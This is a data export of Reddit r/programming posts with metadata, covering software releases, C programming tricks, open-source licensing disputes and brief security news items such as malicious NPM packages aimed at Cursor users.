+1kel6sl,reddit,Anubis saved our websites from a DDoS attack,,2025-05-04T14:32:02Z,programming,programming,technology,Technology,[],0,268,47,,0.91,https://fabulous.systems/posts/2025/05/anubis-saved-our-websites-from-a-ddos-attack/,namanyayg,2025-05-25T17:00:15.906115Z
+1kixcqd,reddit,Malicious NPM Packages Target Cursor AI’s macOS Users,"Three malicious NPM packages posing as developer tools for the popular Cursor AI code editor were caught deploying a backdoor on macOS systems, vulnerability detection firm Socket reports.
+
+Cursor is a proprietary integrated development environment (IDE) that integrates AI features directly within the coding environment. It offers tiered access to LLMs, with premium language models priced per request.
+
+The packages, named sw‑cur, sw‑cur1, and aiide-cur, claim to provide cheap access to Cursor, exploiting the developers’ interest in avoiding paying the fees.
+
+All three packages were published by a threat actor using the NPM usernames gtr2018 and aiide, and have amassed over 3,200 downloads to date.
+
+Further details are inside the links.
+
+https://www.securityweek.com/malicious-npm-packages-target-cursor-ais-macos-users
+
+May 8, 2025
+
+",2025-05-10T00:15:44Z,programming,programming,technology,Technology,[],0,262,36,,0.95,https://socket.dev/blog/malicious-npm-packages-hijack-cursor-editor-on-macos,Choobeen,2025-05-25T17:00:17.028752Z
+1kf5trs,reddit,Skills Rot At Machine Speed? AI Is Changing How Developers Learn And Think,,2025-05-05T07:35:17Z,programming,programming,technology,Technology,[],0,251,235,,0.82,https://www.forbes.com/councils/forbestechcouncil/2025/04/28/skills-rot-at-machine-speed-ai-is-changing-how-developers-learn-and-think/,nephrenka,2025-05-25T17:00:18.069354Z
+1kjw00j,reddit,OpenSearch 3.0 major release is out!,"OpenSearch 3.0 is out (first major release since the open source project joined the Linux Foundation), with nice upgrades to performance, data management, vector functionality, and  more.   
+Some of the highlights include:
+
+* Upgrade to Apache Lucene 10 and JDK 21+
+* Pull-based ingestion for streaming data, with support for Apache Kafka and Amazon Kinesis
+* Separate reads and writes for remote store for granular scaling and resource isolation
+* Power agentic AI with native MCP (Model Context Protocol) support
+* Investigate logs with expanded PPL query tools, backed by Apache Calcite
+* Achieve 2.5x faster binary quantization with concurrent segment search",2025-05-11T08:11:54Z,programming,programming,technology,Technology,[],0,249,37,,0.91,https://opensearch.org/blog/unveiling-opensearch-3-0/,horovits,2025-05-25T17:00:20.514270Z
+1k9sv75,reddit,Computer Science Journals stored passwords in the clear.,"Just a warning to anyone creating an account at [https://www.cscjournals.org/](https://www.cscjournals.org/) ...
+
+I registered at [http://www.cscjournals.org](http://www.cscjournals.org), and was surprised to find out this morning that they stored my password in the clear; they emailed it to me!
+
+Just be sure, when using [https://www.cscjournals.org/](https://www.cscjournals.org/) that you don't reuse an existing password.",2025-04-28T11:07:42Z,programming,programming,technology,Technology,[],0,236,107,,0.91,http://www.cscjournals.org,lelanthran,2025-05-25T17:00:21.524389Z
+1kes3wq,reddit,I taught Copilot to analyze Windows Crash Dumps - it's amazing.,"**TL;DR**
+
+**A Model Context Protocol Server to connect WinDBG with AI**
+
+* Repository: [svnscha/mcp-windbg](https://github.com/svnscha/mcp-windbg)
+* License: MIT
+
+Ever felt like crash dump analysis is stuck in the past? While the rest of software development has embraced modern tools, we're still manually typing commands like `!analyze -v` in WinDbg.
+
+I decided to change that. Inspired by the capabilities of AI, I integrated GitHub Copilot with WinDbg, creating a tool that allows for conversational crash dump analysis.
+
+Instead of deciphering hex codes and stack traces, you can now ask, ""**Why did this application crash?**"" and receive a clear, contextual answer.
+
+Check out the full write-up and demo videos here: [The Future of Crash Analysis: AI Meets WinDbg](https://svnscha.de/posts/ai-meets-windbg/)
+
+Feedback and thoughts are welcome!",2025-05-04T19:26:39Z,programming,programming,technology,Technology,[],0,227,31,,0.79,https://svnscha.de/posts/ai-meets-windbg/,thelostcode,2025-05-25T17:00:23.065076Z
+1kptwqj,reddit,An algorithm to square floating-point numbers with IEEE-754. Turned to be slower than normal squaring.,"This is the algorithm I created:
+
+    typedef union {
+        uint32_t i;
+        float f;
+    } f32;
+    
+    # define square(x) ((x)*(x))
+    
+    f32 f32_sqr(f32 u) {
+        const uint64_t m = (u.i & 0x7FFFFF);
+        u.i = (u.i & 0x3F800000) << 1 | 0x40800000;
+        u.i |= 2 * m + (square(m) >> 23);
+        return u;
+    }
+
+Unfortunately it's slower than normal squaring but it's interesting anyways.
+
+# How my bitwise float squaring function works — step by step
+
+**Background:**  
+Floating-point numbers in IEEE-754 format are stored as:
+
+* 1 sign bit (S)
+* 8 exponent bits (E)
+* 23 mantissa bits (M)
+
+The actual value is:  
+(-1)^(S) × 2^(E - 127) × (1 + M ÷ 2^(23))
+
+# Goal:
+
+Compute the square of a float `x` by doing evil IEEE-754 tricks.
+
+**Step 1: Manipulate the exponent bits**
+
+I took a look of what an squared number looks like in binary.
+
+|Number|Exponent|Squared exponent|
+|:-|:-|:-|
+|5|1000 0001|1000 0011|
+|25|1000 0011|1000 0111|
+
+Ok, and what about the formula?
+
+(2\^(E))² = 2\^(E × 2)
+
+E = ((E - 127) × 2) + 127
+
+E = 2 × E - 254 + 127
+
+E = 2 × E - 127
+
+But, i decided to ignore the formula and stick to what happens in reality.  
+In reality the numbers seems to be multiplied by 2 and added by 1. And the last bit gets ignored.
+
+That's where this magic constant came from `0x40800000`.  
+It adds one after doubling the number and adds back the last bit.
+
+**Step 2: Adjust the mantissa for the square**
+
+When squaring, we need to compute (1 + M)^(2,) which expands to 1 + 2 × M + M².
+
+Because the leading 1 is implicit, we focus on calculating the fractional part. We perform integer math on the mantissa bits to approximate this and merge the result back into the mantissa bits of the float.
+
+**Step 3: Return the new float**
+
+After recombining the adjusted exponent and mantissa bits (and zeroing the sign bit, since squares are never negative), we return the new float as an really decent approximation of the square of the original input.
+
+# Notes:
+
+* Although it avoids floating-point multiplication, it uses 64-bit integer multiplication, which can be slower on many processors.
+* Ignoring the highest bit of the exponent simplifies the math but introduces some accuracy loss.
+* The sign bit is forced to zero because squaring a number always yields a non-negative result.
+
+# TL;DR:
+
+Instead of multiplying `x * x` directly, this function hacks the float's binary representation by doubling the exponent bits, adjusting the mantissa with integer math, and recombining everything to produce an approximate `x²`.
+
+Though it isn't more faster.",2025-05-18T20:41:31Z,programming,programming,technology,Technology,[],0,229,17,,0.9,https://gist.github.com/CiroZDP/55393f2d16f5f7a9f93e51d97873d7b1,CiroDOS,2025-05-25T17:00:24.120016Z
+1kel6sh,reddit,The language brain matters more for programming than the math brain? (2020),,2025-05-04T14:32:01Z,programming,programming,technology,Technology,[],0,225,88,,0.86,https://massivesci.com/articles/programming-math-language-python-women-in-science/,namanyayg,2025-05-25T17:00:25.378303Z
+1krrumv,reddit,System Design: Building TikTok-Style Video Feed for 100 Million Users,,2025-05-21T07:22:54Z,programming,programming,technology,Technology,[],0,224,54,,0.86,https://animeshgaitonde.medium.com/system-design-building-tiktok-style-video-feed-for-100-million-users-2b3e332678d8?source=friends_link&sk=a605eff6c53e53fb391e1e1f000c7f51,Local_Ad_6109,2025-05-25T17:00:26.902558Z
+1ksi96i,reddit,"Things You Should Never Do, Part I","I feel like, if this got shared without a timestamp and references to the technologies changed, nobody would notice ... it is 25 years old.",2025-05-22T04:39:22Z,programming,programming,technology,Technology,[],0,213,162,,0.82,https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/,esiy0676,2025-05-25T17:00:28.269507Z
+1kc9xhi,reddit,Redis is now available under the the OSI-approved AGPLv3 open source license.,Can we now confidently utilize Redis without further concern?,2025-05-01T14:21:02Z,programming,programming,technology,Technology,[],0,214,26,,0.95,https://redis.io/blog/agplv3/,quanhua92,2025-05-25T17:00:30.275046Z
+1ktzh8k,reddit,The GCC compiler backend can now fully bootstrap the Rust compiler,,2025-05-24T01:00:12Z,programming,programming,technology,Technology,[],0,215,4,,0.93,https://old.reddit.com/r/rust/comments/1ktph3c/media_the_gcc_compiler_backend_can_now_fully,ketralnis,2025-05-25T17:00:31.325582Z
+1ktkxuq,reddit,Java turns 30,,2025-05-23T14:27:21Z,programming,programming,technology,Technology,[],0,201,42,,0.94,https://www.java.com/releases/,mateusnr,2025-05-25T17:00:32.189797Z
+1kkqbc2,reddit,Platform Engineering: Evolution or just a Rebranding of DevOps?,,2025-05-12T11:38:54Z,programming,programming,technology,Technology,[],0,191,41,,0.9,https://www.pulumi.com/blog/platform-eng-rebrand/,agbell,2025-05-25T17:00:33.242114Z
+1kg4uy9,reddit,"The Curse of Knowing How, or; Fixing Everything",,2025-05-06T13:45:08Z,programming,programming,technology,Technology,[],0,186,14,,0.95,https://notashelf.dev/posts/curse-of-knowing,iamkeyur,2025-05-25T17:00:34.500038Z
+1ksafg1,reddit,Why Property Testing Finds Bugs Unit Testing Does Not,,2025-05-21T21:59:34Z,programming,programming,technology,Technology,[],0,184,61,,0.8,https://buttondown.com/hillelwayne/archive/why-property-testing-finds-bugs-unit-testing-does/,ketralnis,2025-05-25T17:00:35.455540Z
+1kt90rd,reddit,Kilo: A text editor in less than 1000 LOC with syntax highlight and search,,2025-05-23T02:46:42Z,programming,programming,technology,Technology,[],0,179,55,,0.85,https://github.com/antirez/kilo,namanyayg,2025-05-25T17:00:36.604865Z
+1kq9bza,reddit,"Detecting malicious Unicode (Daniel Stenberg, curl)",,2025-05-19T11:30:10Z,programming,programming,technology,Technology,[],0,174,28,,0.92,https://daniel.haxx.se/blog/2025/05/16/detecting-malicious-unicode/,Skaarj,2025-05-25T17:00:37.890851Z
+1kozl0x,reddit,Circular Reasoning in Unit Tests — It works because it does what it does,,2025-05-17T18:20:47Z,programming,programming,technology,Technology,[],0,171,102,,0.93,https://laser-coder.net/articles/circular-reasoning/index.html,Jason_Pianissimo,2025-05-25T17:00:39.711262Z
+1k85b35,reddit,That's How We've Always Done Things Around Here,"We do this in software way more than we think:  
+We inherit a process or a rule and keep following it, without questioning why it exists in the first place.
+
+It’s like that old story:  
+Someone cuts off the turkey tail before cooking, just because that's how their grandma did it. (spoiler alert, grandma’s pan was just too small.) 
+
+Some examples of ""turkey tails"" I've seen:
+
+* Following tedious dev processes nobody understands anymore.
+* Enforcing 80-character line limits… in 2025.
+* Leaving TODO comments in codebases for 6+ years.
+
+Tradition can be helpful. But if we don't question it, it can turn into pure baggage.
+
+**What’s the most enormous “turkey tail” you’ve seen in your company or project?**
+
+Curious to hear what others have run into. 🦃",2025-04-26T05:12:16Z,programming,programming,technology,Technology,[],0,170,170,,0.79,https://alexcristea.substack.com/p/thats-how-weve-always-done-things,alexcristea,2025-05-25T17:00:41.208224Z
+1ke1gkk,reddit,"NATS.io remains open source under the Cloud Native Computing Foundation, after Synadia tried to “withdraw” the project and relicense to non-open source","Last week Synadia, the original donor of the NATS project, has notified the Cloud Native Computing Foundation (CNCF)—the open source foundation under which Kubernetes and other popular projects reside—of its intention to “withdraw” the NATS project from the foundation and relicense the code under the Business Source License (BUSL)—a non-open source license that restricts user freedoms and undermines years of open development.
+
+Following the outcry of the community, a settle has been reached, so that NATS remains open source under the CNCF.   
+This is a true win for the open source and cloud native community.
+
+[https://www.cncf.io/announcements/2025/05/01/cncf-and-synadia-align-on-securing-the-future-of-the-nats-io-project/](https://www.cncf.io/announcements/2025/05/01/cncf-and-synadia-align-on-securing-the-future-of-the-nats-io-project/)",2025-05-03T19:47:15Z,programming,programming,technology,Technology,[],0,171,12,,0.93,https://www.cncf.io/announcements/2025/05/01/cncf-and-synadia-align-on-securing-the-future-of-the-nats-io-project/,horovits,2025-05-25T17:00:43.166515Z
+1kont2l,reddit,What’s one time YAGNI didn’t apply—and you were glad you built it early?,"We all know the principle: *You Ain’t Gonna Need It.* Don’t build features, abstractions, or infrastructure “just in case” someone needs them later.
+
+But I’m curious—what’s something you built early that technically violated YAGNI, but ended up being a great call?
+
+Maybe it was:
+
+* Laying the groundwork for internationalization before it was needed
+* Designing the system with plug-and-play architecture in mind
+* Adding logging or metrics hooks that paid off later
+* Supporting time zones up front before anyone asked for them
+* Setting up automated code formatting and CI on day one
+
+I would love to hear what those “YAGNI exceptions” look like in your experience and which ones you now deliberately include when starting a new project.",2025-05-17T08:04:05Z,programming,programming,technology,Technology,[],0,161,159,,0.79,https://open.substack.com/pub/alexcristea/p/when-yagni-actually-makes-sense?r=17kzge&utm_campaign=post&utm_medium=web&showWelcomeOnShare=false,alexcristea,2025-05-25T17:00:44.154462Z
+1knm817,reddit,OpenJDK talks about adding a JSON API to the Java Standard Library,,2025-05-15T23:11:19Z,programming,programming,technology,Technology,[],0,165,74,,0.93,https://mail.openjdk.org/pipermail/core-libs-dev/2025-May/145905.html,davidalayachew,2025-05-25T17:00:46.175947Z
+1kbz48k,reddit,Vulnerability researcher finds potential supply chain attack opportunity on node.js github repo,,2025-05-01T03:21:02Z,programming,programming,technology,Technology,[],0,160,26,,0.91,https://www.praetorian.com/blog/agent-of-chaos-hijacking-nodejss-jenkins-agents/,ScottContini,2025-05-25T17:00:47.597329Z
+1ksae6c,reddit,Reading code is still the most effective method to debug multi-thread bug,,2025-05-21T21:58:03Z,programming,programming,technology,Technology,[],0,163,41,,0.88,https://nanxiao.me/en/reading-code-is-still-the-most-effective-method-to-debug-multi-thread-bug/,ketralnis,2025-05-25T17:00:48.712410Z
+1k9kljo,reddit,Why “Learn to Code” Failed,,2025-04-28T02:05:25Z,programming,programming,technology,Technology,[],0,153,170,,0.79,https://www.youtube.com/watch?v=bThPluSzlDU,BlueGoliath,2025-05-25T17:00:49.888230Z
+1knbvg8,reddit,"Oh Sh*t, My App is Successful and I Didn’t Think About Accessibility",,2025-05-15T16:00:40Z,programming,programming,technology,Technology,[],0,150,27,,0.82,https://blog.jacobstechtavern.com/p/oh-sht-my-app-is-successful-and-i,jacobs-tech-tavern,2025-05-25T17:00:52.000136Z
+1kg6zws,reddit,A Critical look at MCP,Is it me or is it Anthropic...,2025-05-06T15:14:13Z,programming,programming,technology,Technology,[],0,147,65,,0.88,https://raz.sh/blog/2025-05-02_a_critical_look_at_mcp,--raz,2025-05-25T17:00:53.037420Z
+1k7naei,reddit,Synadia tries to “withdraw” the NATS project from the CNCF and relicense to BSL non-open source license,"Synadia, the original donor of the NATS project, has notified the Cloud Native Computing Foundation (CNCF)—the open source foundation under which Kubernetes and other popular projects reside—of its intention to “withdraw” the NATS project from the foundation and relicense the code under the Business Source License (BUSL)—a non-open source license that restricts user freedoms and undermines years of open development.",2025-04-25T15:08:42Z,programming,programming,technology,Technology,[],0,147,56,,0.94,https://www.cncf.io/blog/2025/04/24/protecting-nats-and-the-integrity-of-open-source-cncfs-commitment-to-the-community/,horovits,2025-05-25T17:00:54.455903Z
+1kn3xya,reddit,do {...} while (0) in macros,,2025-05-15T09:28:12Z,programming,programming,technology,Technology,[],0,142,41,,0.88,https://www.pixelstech.net/article/1390482950-do-%7B-%7D-while-%280%29-in-macros,stackoverflooooooow,2025-05-25T17:00:55.944333Z
+1kk47gl,reddit,MIDA: For those brave souls still writing C in 2025 who are tired of passing array lengths everywhere,"For those of you that are still writing C in the age of memory-safe languages (I am with you), I wanted to share a little library I made that helps with one of C's most annoying quirks - the complete lack of array metadata.
+
+## What is it?
+
+**MIDA** (Metadata Injection for Data Augmentation) is a tiny header-only C library that attaches metadata to your arrays and structures, so you can actually *know how big they are* without having to painstakingly track this information manually. Revolutionary concept, I know.
+
+## Why would anyone do this?
+
+Because sometimes you're stuck maintaining legacy C code. Or working on embedded systems. Or you just enjoy the occasional segfault to keep you humble. Whatever your reasons for using C in 2024, MIDA tries to make one specific aspect less painful.
+
+If you've ever written code like this:
+```c
+void process_data(int *data, size_t data_length) {
+    // pray that the caller remembered the right length
+    for (size_t i = 0; i < data_length; i++) {
+        // do stuff
+    }
+}
+```
+
+And wished you could just do:
+```c
+void process_data(int *data) {
+    size_t data_length = mida_length(data);  // ✨ magic ✨
+    for (size_t i = 0; i < data_length; i++) {
+        // do stuff without 27 redundant size parameters
+    }
+}
+```
+
+Then this might be for you!
+
+## How it works
+
+In true C fashion, it's all just pointer arithmetic and memory trickery. MIDA attaches a small metadata header before your actual data, so your pointers work exactly like normal C arrays:
+
+```c
+// For the brave C99 users
+int *numbers = mida_array(int, { 1, 2, 3, 4, 5 });
+
+// For C89 holdouts (respect for maintaining 35-year-old code)
+int data[] = {1, 2, 3, 4, 5};
+MIDA_BYTEMAP(bytemap, sizeof(data));
+int *wrapped = mida_wrap(data, bytemap);
+```
+
+## But wait, there's more!
+
+You can even add your own custom metadata fields:
+
+```c
+// Define your own metadata structure
+struct packet_metadata {
+    uint16_t packet_id;  // Your own fields
+    uint32_t crc;
+    uint8_t flags;
+    MIDA_EXT_METADATA;   // Standard metadata fields come last
+};
+
+// Now every array can carry your custom info
+uint8_t *packet = mida_ext_malloc(struct packet_metadata, sizeof(uint8_t), 128);
+
+// Access your metadata
+struct packet_metadata *meta = mida_ext_container(struct packet_metadata, packet);
+meta->packet_id = 0x1234;
+meta->flags = FLAG_URGENT | FLAG_ENCRYPTED;
+```
+
+## ""But I'm on an embedded platform and can't use malloc!""
+
+No problem! MIDA works fine with stack-allocated memory (or any pre-allocated buffer):
+
+```c
+// Stack-allocated array with metadata
+uint8_t raw_buffer[64];
+MIDA_BYTEMAP(bytemap, sizeof(raw_buffer));
+uint8_t *buffer = mida_wrap(raw_buffer, bytemap);
+
+// Now you can pretend like C has proper arrays
+printf(""Buffer length: %zu\n"", mida_length(buffer));
+```
+
+## Is this a joke?
+
+Only partially! While I recognize that there are many modern alternatives to C that solve these problems more elegantly, sometimes you simply have to work with C. This library is for those times.
+
+The entire thing is in a single header file (~600 lines), MIT licensed, and available at: https://github.com/lcsmuller/mida
+
+So if like me, you find yourself muttering ""I wish C just knew how big its arrays were"" for the 1000th time, maybe give it a try.
+
+Or you know, use Rust/Go/any modern language and laugh at us C programmers from the lofty heights of memory safety. That's fine too.",2025-05-11T15:54:07Z,programming,programming,technology,Technology,[],0,144,39,,0.81,https://github.com/lcsmuller/mida,LucasMull,2025-05-25T17:00:57.003764Z
+1kfgptl,reddit,Why We Should Learn Multiple Programming Languages,,2025-05-05T16:59:04Z,programming,programming,technology,Technology,[],0,138,159,,0.76,https://www.architecture-weekly.com/p/why-we-should-learn-multiple-programming,Adventurous-Salt8514,2025-05-25T17:00:58.301258Z
+1kamapm,reddit,Python programming using ellipsis (...),,2025-04-29T12:07:51Z,programming,programming,technology,Technology,[],0,137,7,,0.93,https://susam.net/elliptical-python-programming.html,symbolicard,2025-05-25T17:01:00.647524Z
+1ke8c7t,reddit,A faster way to copy SQLite databases between computers,,2025-05-04T01:25:42Z,programming,programming,technology,Technology,[],0,131,5,,0.92,https://alexwlchan.net/2025/copying-sqlite-databases/,namanyayg,2025-05-25T17:01:01.533639Z
+1kg37vm,reddit,git stash driven refactoring,,2025-05-06T12:28:19Z,programming,programming,technology,Technology,[],0,127,126,,0.87,https://kobzol.github.io/programming/2025/05/06/git-stash-driven-refactoring.html,Kobzol,2025-05-25T17:01:02.427163Z
+1kdo78b,reddit,How we solved the Royal Game of Ur,,2025-05-03T08:30:39Z,programming,programming,technology,Technology,[],0,124,29,,0.91,https://royalur.net/solved,sothatsit,2025-05-25T17:01:04.663610Z
+1k8psm3,reddit,Creative usernames and Spotify account hijacking,,2025-04-26T23:09:26Z,programming,programming,technology,Technology,[],0,119,16,,0.96,https://engineering.atspotify.com/2013/06/creative-usernames/,hongminhee,2025-05-25T17:01:05.949795Z
+1kbqjw5,reddit,But what is quantum computing? (Grover's Algorithm),,2025-04-30T20:30:11Z,programming,programming,technology,Technology,[],0,114,13,,0.9,https://www.youtube.com/watch?v=RQWpF2Gb-gU,Advanced_Toe_298,2025-05-25T17:01:06.921916Z
+1kop1g0,reddit,What the first 2 Years as a Software Engineer Taught Me (Beyond Just Code),,2025-05-17T09:33:06Z,programming,programming,technology,Technology,[],0,114,32,,0.77,https://thenukaovin.medium.com/two-years-in-have-i-grown-as-a-software-engineer-or-more-human-about-it-e7311cf5637a,innatari,2025-05-25T17:01:07.901095Z
+1kk5j0m,reddit,Programming Myths We Desperately Need to Retire,,2025-05-11T16:52:28Z,programming,programming,technology,Technology,[],0,108,290,,0.68,https://amritpandey.io/programming-myths-we-desperately-need-to-retire/,waozen,2025-05-25T17:01:08.848793Z
+1k7h146,reddit,Introduction to Quad Trees,,2025-04-25T09:49:51Z,programming,programming,technology,Technology,[],0,108,19,,0.93,https://hypersphere.blog/blog/quad-trees/,ab-azure,2025-05-25T17:01:11.411729Z
+1khsfqr,reddit,How Google Measures and Manages Tech Debt,,2025-05-08T15:07:51Z,programming,programming,technology,Technology,[],0,110,35,,0.83,https://newsletter.techworld-with-milan.com/p/how-google-measures-and-manages-tech,milanm08,2025-05-25T17:01:12.419323Z
+1kam686,reddit,Why performance optimization is hard work,,2025-04-29T12:01:20Z,programming,programming,technology,Technology,[],0,110,25,,0.92,https://purplesyringa.moe/blog/why-performance-optimization-is-hard-work/,imachug,2025-05-25T17:01:13.632740Z
+1kubafk,reddit,So you think you can validate email addresses A journey down RFC5321,"Recording quality aside, I figure this is (still) very relevant for anyone dealing with email addresses.",2025-05-24T13:12:23Z,programming,programming,technology,Technology,[],0,121,37,,0.88,https://www.youtube.com/watch?v=xxX81WmXjPg,SuspiciousDepth5924,2025-05-25T17:01:14.692234Z
+1kimazl,reddit,21 GB/s CSV Parsing Using SIMD on AMD 9950X,,2025-05-09T16:10:03Z,programming,programming,technology,Technology,[],0,109,19,,0.92,https://nietras.com/2025/05/09/sep-0-10-0/,iamkeyur,2025-05-25T17:01:15.700146Z
+1kihwge,reddit,WebAssembly 2.0,,2025-05-09T13:00:35Z,programming,programming,technology,Technology,[],0,110,36,,0.95,https://www.w3.org/TR/wasm-core-2/,ChiliPepperHott,2025-05-25T17:01:16.697711Z
+1kk9fy6,reddit,"StarGuard — CLI that spots fake GitHub stars, risky dependencies and licence traps","When I came across a study that traced [4.5 million fake GitHub stars](https://arxiv.org/abs/2412.13459), it confirmed a suspicion I’d had for a while: stars are noisy. The issue is they’re visible, they’re persuasive, and they still shape hiring decisions, VC term sheets, and dependency choices—but they say very little about actual quality.
+
+I wrote StarGuard to put that number in perspective based on my own methodology inspired with what they did and to fold a broader supply-chain check into one command-line run.
+
+It starts with the simplest raw input: every `starred_at` timestamp GitHub will give. It applies a median-absolute-deviation test to locate sudden bursts. For each spike, StarGuard pulls a random sample of the accounts behind it and asks: how old is the user? Any followers? Any contribution history? Still using the default avatar? From that, it computes a Fake Star Index, between 0 (organic) and 1 (fully synthetic).
+
+But inflated stars are just one issue. In parallel, StarGuard parses dependency manifests or SBOMs and flags common risk signs: unpinned versions, direct Git URLs, lookalike package names. It also scans licences—AGPL sneaking into a repo claiming MIT, or other inconsistencies that can turn into compliance headaches.
+
+It checks contributor patterns too. If 90% of commits come from one person who hasn’t pushed in months, that’s flagged. It skims for obvious code red flags: eval calls, minified blobs, sketchy install scripts—because sometimes the problem is hiding in plain sight.
+
+All of this feeds into a weighted scoring model. The final Trust Score (0–100) reflects repo health at a glance, with direct penalties for fake-star behaviour, so a pretty README badge can’t hide inorganic hype.
+
+I added for the fun of it it generating a cool little badge for the trust score lol.
+
+Under the hood,  its all uses, heuristics, and a lot of GitHub API paging. Run it on any public repo with:
+
+    python starguard.py owner/repo --format markdown
+
+It works without a token, but you’ll hit rate limits sooner.
+
+Repo is: [repository](https://github.com/m-ahmed-elbeskeri/Starguard)
+
+Also here is the repository the researched made for reference and for people to show it some love.
+
+[Researcher repository](https://github.com/hehao98/StarScout/tree/main)
+
+Please provide any feedback you can.
+
+I’m mainly interested in two things going forward:
+
+1. Does the Fake Star Index feel accurate when you try it on repos you already know?
+2. What other quality signals would actually be useful—test coverage? open issue ratios? community responsiveness?",2025-05-11T19:41:46Z,programming,programming,technology,Technology,[],0,103,24,,0.93,https://github.com/m-ahmed-elbeskeri/Starguard,WelcomeMysterious122,2025-05-25T17:01:17.743180Z
+1kqjrt1,reddit,Don't Guess My Language | Vitonsky,"If you’re still using IP geolocation to decide what language to show, stop screwing around. It’s a broken assumption dressed up as a feature.",2025-05-19T18:51:16Z,programming,programming,technology,Technology,[],0,102,20,,0.95,https://vitonsky.net/blog/2025/05/17/language-detection/,waozen,2025-05-25T17:01:18.827313Z
+1ka3w3p,reddit,How I got exploited at my first startup,,2025-04-28T19:13:27Z,programming,programming,technology,Technology,[],0,103,10,,0.89,https://blog.jacobstechtavern.com/p/the-side-hustle-from-hell,jacobs-tech-tavern,2025-05-25T17:01:19.817853Z
+1kbxdvs,reddit,How I Found Malware in a BeamNG Mod,,2025-05-01T01:47:46Z,programming,programming,technology,Technology,[],0,98,15,,0.96,https://lemonyte.com/blog/beamng-malware,NXGZ,2025-05-25T17:01:20.752358Z
+1kbdj9s,reddit,Giving V8 a Heads-Up: Faster JavaScript Startup with Explicit Compile Hints,,2025-04-30T10:54:50Z,programming,programming,technology,Technology,[],0,101,5,,0.91,https://v8.dev/blog/explicit-compile-hints,self,2025-05-25T17:01:21.726752Z
+1kfny7x,reddit,q5.js v3.0 has been RELEASED!,,2025-05-05T21:46:24Z,programming,programming,technology,Technology,[],0,95,19,,0.82,https://www.youtube.com/watch?v=xizIG1QNc7g,qashto,2025-05-25T17:01:22.599445Z
+1k7p5dr,reddit,"What Does ""use client"" Do? — overreacted",,2025-04-25T16:25:31Z,programming,programming,technology,Technology,[],0,97,57,,0.81,https://overreacted.io/what-does-use-client-do/,gaearon,2025-05-25T17:01:23.614740Z
+1kujjip,reddit,"A response to ""Programmers Are Users"": stopping the enshittification",,2025-05-24T19:19:47Z,programming,programming,technology,Technology,[],0,144,89,,0.79,https://www.bennett.ink/a-response-to-programmers-are-users,bennett-dev,2025-05-25T17:01:24.876660Z
+1kr9y6h,reddit,Reports of Deno's Demise Have Been Greatly Exaggerated,,2025-05-20T16:56:08Z,programming,programming,technology,Technology,[],0,92,37,,0.86,https://deno.com/blog/greatly-exaggerated,ketralnis,2025-05-25T17:01:26.316800Z
+1kp9w35,reddit,Push Ifs Up And Fors Down,,2025-05-18T02:44:03Z,programming,programming,technology,Technology,[],0,91,41,,0.83,https://matklad.github.io/2023/11/15/push-ifs-up-and-fors-down.html,hongminhee,2025-05-25T17:01:27.458872Z
+1kst0e1,reddit,Announcing TypeScript Native Previews,,2025-05-22T15:04:50Z,programming,programming,technology,Technology,[],0,92,42,,0.89,https://devblogs.microsoft.com/typescript/announcing-typescript-native-previews/,DanielRosenwasser,2025-05-25T17:01:28.749245Z
+1k7w1vi,reddit,GCC 15.1 Released,,2025-04-25T21:12:54Z,programming,programming,technology,Technology,[],0,94,3,,0.88,https://gcc.gnu.org/pipermail/gcc/2025-April/245971.html,ketralnis,2025-05-25T17:01:30.010569Z
+1kdd0bb,reddit,Strings Just Got Faster,,2025-05-02T21:56:28Z,programming,programming,technology,Technology,[],0,91,30,,0.84,https://inside.java/2025/05/01/strings-just-got-faster/,ketralnis,2025-05-25T17:01:30.858310Z
+1ksmred,reddit,Oodle 2.9.14 and Intel 13th/14th gen CPUs: Intel's confirms it's a hardware problem,,2025-05-22T09:51:12Z,programming,programming,technology,Technology,[],0,87,15,,0.95,https://fgiesen.wordpress.com/2025/05/21/oodle-2-9-14-and-intel-13th-14th-gen-cpus/,self,2025-05-25T17:01:31.891608Z
